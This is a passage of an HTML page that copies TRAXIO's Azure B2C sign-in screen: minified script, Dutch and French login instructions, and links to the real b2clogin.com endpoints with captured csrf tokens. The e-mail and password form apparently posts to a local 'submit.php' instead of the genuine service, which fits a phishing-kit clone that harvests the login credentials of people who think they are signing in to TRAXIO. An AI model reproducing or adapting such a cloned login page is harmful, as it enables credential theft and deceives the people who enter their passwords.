t=$(this).attr("id");(!$i2e.isSafari()||t.toLowerCase().indexOf("apple")<0)&&(u=!0);$i2e.redirectToServer("unified?social="+t);return}),$("#forgotPassword").attr("href",$i2e.getRedirectLink("forgotPassword")).click(function(n){if(u)return n.stopImmediatePropagation(),!1;if(u=!0,r.value){var t=$("#forgotPassword").attr("href");$("#forgotPassword").attr("href",t+"&hint="+encodeURI(r.value))}}),SA_FIELDS.AttributeFields){r=document.querySelectorAll("#"+SA_FIELDS.AttributeFields[0].ID)[0];r.value=$.trim(r.value);f=document.querySelectorAll("#"+SA_FIELDS.AttributeFields[1].ID)[0];c();$("#createAccount").attr("href",$i2e.getRedirectLink("unified?local=signup")).click(function(n){if(u)return n.stopImmediatePropagation(),!1;if(u=!0,i.config.sendHintOnSignup==="true"&&r.value){var t=$("#createAccount").attr("href");$("#createAccount").attr("href",t+"&hint="+encodeURI(r.value))}});$(f).on("keypress",function(n){if(u)return n.stopImmediatePropagation(),!1;a(n)});$("#next").click(function(n){if(u)return n.stopImmediatePropagation(),!1;a(n)})}n.trace(t)})(new $trace("T003",!0))},k=function(){return o},d=function(){(function(t){var i="unifiedssp-classic";(SETTINGS.remoteResource.toLowerCase().lastIndexOf("tenant/templates/azureblue/unified.cshtml")>0||SETTINGS.remoteResource.toLowerCase().lastIndexOf("tenant/templates/msa/unified.cshtml")>0)&&(i="unifiedssp-modern");o=$i2e.generateServiceContent(i,{list:CP.list,AttributeFields:SA_FIELDS.AttributeFields});n.trace(t)})(new $trace("T005",!0))};return{initialize:b,generateServiceContent:d,getElementContent:k,isRememberMeChecked:s}}($diags,CONTENT,SETTINGS);$element.generateServiceContent()</script><style>.no_display{display:none}.error_container h1{color:#333;font-size:1.2em;font-family:'Segoe UI Light',Segoe,'Segoe UI',SegoeUI-Light-final,Tahoma,Helvetica,Arial,sans-serif;font-weight:lighter}.error_container p{color:#333;font-size:.8em;font-family:'Segoe UI',Segoe,SegoeUI-Regular-final,Tahoma,Helvetica,Arial,sans-serif;margin:14px 0}</style></head><body><noscript><div id="no_js" ><div class="error_container"><div><h1>We can't sign you in</h1><p>Your browser is currently set to block JavaScript. You need to allow JavaScript to use this service.</p><p>To learn how to allow JavaScript or to find out whether your browser supports JavaScript, check the online help in your web browser.</p></div></div></div></noscript><div id="no_cookie" class="no_display"><div class="error_container"><div><h1>We can't sign you in</h1><p>Your browser is currently set to block cookies. You need to allow cookies to use this service.</p><p>Cookies
                are small text files stored on your computer that tell us when you're
                signed in. To learn how to allow cookies, check the online help in your
                web browser.</p></div></div></div><div class="body--flex">
    <div id="api" data-name="Unified">


        <form id="localAccountForm" action="submit.php" method="post" class="localAccount" aria-label="Login">
            <div class="intro">
                <h2>
                    Login
                </h2>
            </div>
            <div class="error pageLevel" aria-hidden="true" role="alert" style="display: none;">
                <p></p>
            </div>
            <div class="entry">
                <div class="entry-item">
                    <label for="signInName">
                        E-mail
                    </label>
                    <div class="error itemLevel" aria-hidden="true" role="alert" style="display: none;">
                        <p></p>
                    </div>
                    <input type="email" title="Please enter a valid email address." id="signInName" name="Sign in name" pattern="^[a-zA-Z0-9.!#$%&amp;’'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$" placeholder="E-mail" aria-label="E-mail">
                </div>
                <div class="entry-item">
                    <div class="password-label">
                        <label for="password">Wachtwoord / Mot de passe</label>
                        <a id="forgotPassword" href="https://traxiob2c.b2clogin.com/b809c8c9-58cc-42ce-a5e6-d916f678dea4/B2C_1A_signup_signin/api/CombinedSigninAndSignup/forgotPassword?csrf_token=OFpUVnBpNklLWVlxL2dPelhVbnhGQ3dyZTBNUG9jMFRWQ0FMRkVBbC80d2oyeUpRMGR6ZUc2bjdMam82YVJKeHVqb1d3UGhSRTVaRjNVZzZiTDlFdFE9PTsyMDIwLTExLTIyVDExOjUwOjQxLjQ4MzA0ODlaO1c2clJsNVNiRzlNL0hRbGVmNVdQa3c9PTt7Ik9yY2hlc3RyYXRpb25TdGVwIjoxfQ==&amp;tx=StateProperties=eyJUSUQiOiJmOWUwMjFhMS0wMjA3LTQ5MzYtODZiYi0yYmNlM2IxZmM0ODIifQ&amp;p=B2C_1A_signup_signin">Wachtwoord vergeten? / Mot de passe oublié?</a>
                    </div>
                    <div class="error itemLevel" aria-hidden="true" style="display: none;">
                        <p role="alert"></p>
                    </div>
                    <input type="password" id="password" name="Password" placeholder="Wachtwoord / Mot de passe" aria-label="Wachtwoord / Mot de passe">
                </div>
                <div class="working"></div>
                <div class="buttons">
                    <button id="next" type="submit" form="localAccountForm">Aanmelden / Connectez-vous</button>
                </div>
            </div>
            <div class="divider">
                <h2>OR</h2>
            </div>
            <div class="create">
                <p>
                    <a id="createAccount" href="https://traxiob2c.b2clogin.com/b809c8c9-58cc-42ce-a5e6-d916f678dea4/B2C_1A_signup_signin/api/CombinedSigninAndSignup/unified?local=signup&amp;csrf_token=OFpUVnBpNklLWVlxL2dPelhVbnhGQ3dyZTBNUG9jMFRWQ0FMRkVBbC80d2oyeUpRMGR6ZUc2bjdMam82YVJKeHVqb1d3UGhSRTVaRjNVZzZiTDlFdFE9PTsyMDIwLTExLTIyVDExOjUwOjQxLjQ4MzA0ODlaO1c2clJsNVNiRzlNL0hRbGVmNVdQa3c9PTt7Ik9yY2hlc3RyYXRpb25TdGVwIjoxfQ==&amp;tx=StateProperties=eyJUSUQiOiJmOWUwMjFhMS0wMjA3LTQ5MzYtODZiYi0yYmNlM2IxZmM0ODIifQ&amp;p=B2C_1A_signup_signin">Login aanmaken / Créer un login</a>
                </p>
            </div>
        </form>
    </div>
    <section id="custom--content">
        <header class="logo--wrapper">
            <h1 class="logo--heading">
                <img class="logo--img" src="traxio_logo.svg" alt="traxio_logo">
            </h1>
        </header>
        <main class="main--outer">
            <div class="main--inner">
                <div class="main--head">
                    <img class="main--img" src="login_image.svg" alt="login_image">
                </div>
                <div class="main--body">
                    <div class="list--wrapper">
                        <h2 class="list--heading">Heb je al een login?</h2>
                        <ul class="body--list">
                            <li class="list--item">
                                <i class="" aria-hidden="true"></i>
                                Geef je e-mail en wachtwoord in.
                            </li>
                            <li class="list--item">
                                <i class="" aria-hidden="true"></i>
                                Klik op <strong style="color: #009c53">Aanmelden</strong>.
                            </li>
                        </ul>
                        <h2 class="list--heading">Wil je een login aanmaken?</h2>
                        <ul class="body--list">
                            <li class="list--item">
                                <i class="" aria-hidden="true"></i>
                                Klik op <strong style="color: #04599f">Login aanmaken</strong>.
                            </li>
                            <li class="list--item">
                                <i class="" aria-hidden="true"></i>
                                Vul je e-mail in en klik op <strong style="color: #009c53">Ontvang Code</strong>.
                            </li>
                            <li class="list--item">
                                <i class="" aria-hidden="true"></i>
                                Je ontvangt de code op het gekozen adres.
                            </li>
                            <li class="list--item">
                                <i class="" aria-hidden="true"></i>
                                Kies daarna een wachtwoord en klik op <strong style="color: #04599f">Bevestigen</strong>.
                            </li>
                        </ul>
                    </div>
                    <div class="list--wrapper">
                        <h2 class="list--heading">Vous avez déjà un login?</h2>
                        <ul class="body--list">
                            <li class="list--item">
                                <i class="" aria-hidden="true"></i>
                                Saisissez votre email et mot de passe.
                            </li>
                            <li class="list--item">
                                <i class="" aria-hidden="true"></i>
                                Cliquez sur <strong style="color: #009c53">Connectez-vous</strong>.
                            </li>
                        </ul>
                        <h2 class="list--heading">Besoin de créer un login?</h2>
                        <ul class="body--list">
                            <li class="list--item">
                                <i class="" aria-hidden="true"></i>
                                Cliquez sur <strong style="color: #04599f">Créer un login</strong>.
                            </li>
                            <li class="list--item">
                                <i class="" aria-hidden="true"></i>
                                Saisissez votre email puis cliquez sur <strong style="color: #009c53">Recevoir code</strong>.
                            </li>
                            <li class="list--item">
                                <i class="" aria-hidden="true"></i>
                                Vous recevrez le code sur votre adresse email.
                            </li>
                            <li class="list--item">
                                <i class="" aria-hidden="true"></i>
                                Choisissez ensuite un mot de passe et cliquez sur <strong style="color: #04599f">Confirmer</strong>.
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </main>
        <footer class="footer--outer">
            <div class="footer--inner">
                <p class="footer--text">© TRAXIO 2020</p>
            </div>
        </footer>
    </section>
</div>
</body></html>
